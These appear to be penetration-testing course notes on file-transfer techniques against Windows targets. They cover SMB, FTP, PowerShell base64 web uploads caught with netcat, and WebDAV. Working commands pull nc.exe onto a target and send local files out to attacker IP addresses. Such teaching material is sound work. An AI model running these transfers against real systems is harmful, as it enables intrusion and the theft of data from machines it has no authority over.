### SMB Downloads
The Server Message Block (SMB) protocol, running on TCP/445, is commonly used in Windows-based enterprise networks for file sharing. SMB allows users and applications to transfer files between machines. To download files from a Pwnbox, you can set up an SMB server using Impacket's `smbserver.py`. The basic command to set up the server is:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

You can download files using `copy` on the target machine:

```bash
copy \\192.168.220.133\share\nc.exe
```

Newer versions of Windows block unauthenticated guest access. To bypass this, configure the SMB server with a username and password:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Then, mount the SMB server on the target machine:

```bash
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP Downloads
FTP (TCP/21) is another file transfer method. To set up an FTP server on your attack host, install the `pyftpdlib` Python module:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

To transfer files, you can use the built-in FTP client or PowerShellâ€™s `Net.WebClient`:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

For an interactive shell, create a command file for the FTP client:

```bash
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload Operations
Uploading files from a target machine can be done similarly to downloading, using methods like PowerShell encoding or web-based uploads. For encoding, you can base64 encode a file in PowerShell:

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

On the attack host, decode the file:

```bash
echo <base64_string> | base64 -d > hosts
md5sum hosts
```

For web uploads, use a Python web server configured for file uploads, such as `uploadserver`:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Then, use PowerShell to upload the file:

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

This completes the processes for downloading and uploading files using SMB, FTP, and PowerShell web uploads.

### PowerShell Base64 Web Upload

This method demonstrates how PowerShell can be used to encode a file in Base64 and upload it to a server using `Invoke-WebRequest`. The payload is transmitted as a POST request to a specified URI, and the data is then caught using Netcat. Afterward, the data is decoded back to its original form.

### Step 1: Encoding the File in Base64

First, we convert the contents of a file (`hosts` file in this case) into Base64:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))

```

This command reads the `hosts` file as raw bytes and then converts it into a Base64 string.

### Step 2: Uploading the Encoded File via HTTP

Next, we use `Invoke-WebRequest` to upload the Base64 encoded file to a remote server. The server is assumed to be listening on port 8000:

```powershell
Invoke-WebRequest -Uri <http://192.168.49.128:8000/> -Method POST -Body $b64

```

Here, we send the encoded file as a POST request with the Base64 string as the body.

### Step 3: Catching the Data with Netcat

On the receiving server (listening on port 8000), we use Netcat to catch the incoming Base64 data:

```bash
$ nc -lvnp 8000

```

Netcat listens for connections and displays the incoming data. The Base64-encoded content appears in the console.

### Step 4: Decoding the File

After receiving the Base64-encoded data, we decode it back to its original file using the `base64` tool:

```bash
bash
Copy code
echo <base64> | base64 -d -w 0 > hosts

```

This command takes the Base64 data, decodes it, and writes it back to a file (`hosts`).

### SMB Uploads via WebDAV

The next section discusses using **SMB over HTTP** with WebDAV. Many organizations restrict SMB traffic (TCP/445) due to security concerns, but WebDAV provides a workaround by running SMB over HTTP (TCP/80). This method is commonly used for file sharing and remote access.

### Setting Up WebDAV Server

To set up a WebDAV server, we install the necessary Python modules:

```bash
$ sudo pip3 install wsgidav cheroot

```

Then, we run the WebDAV server:

```bash

$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

```

This command runs the WebDAV server on port 80, serving files from `/tmp` with anonymous authentication.

### Connecting to the WebDAV Share

Once the WebDAV server is set up, we can access it from a Windows machine using the `DavWWWRoot` folder:

```powershell
dir \\\\192.168.49.128\\DavWWWRoot

```

This command lists the files available on the WebDAV server.

### Uploading Files via WebDAV

To upload a file (e.g., `SourceCode.zip`) to the WebDAV share, we use the `copy` command:

```powershell
C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.128\\DavWWWRoot\\

```

This uploads the specified file to the WebDAV share, allowing for easy file transfer over HTTP.

### FTP Uploads

FTP (File Transfer Protocol) is another method for uploading files. In this section, we discuss how to set up an FTP server using Python's `pyftpdlib` module and how to use PowerShell or command line tools to upload files to it.

### Setting Up the FTP Server

We start the FTP server with the `--write` flag to allow uploading:

```bash
$ sudo python3 -m pyftpdlib --port 21 --write

```

This starts the FTP server on port 21, with write permissions for anonymous users.

### Uploading Files via PowerShell

Using PowerShell, we can upload a file to the FTP server with the following command:

```powershell
(New-Object Net.WebClient).UploadFile('<ftp://192.168.49.128/ftp-hosts>', 'C:\\Windows\\System32\\drivers\\etc\\hosts')

```

This command uploads the `hosts` file to the specified FTP server.

### Creating an FTP Command File

Alternatively, you can create an FTP command file (`ftpcommand.txt`) to automate the file upload process:

```powershell
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

```

This script automates logging in, setting the transfer mode to binary, uploading the file, and closing the connection.
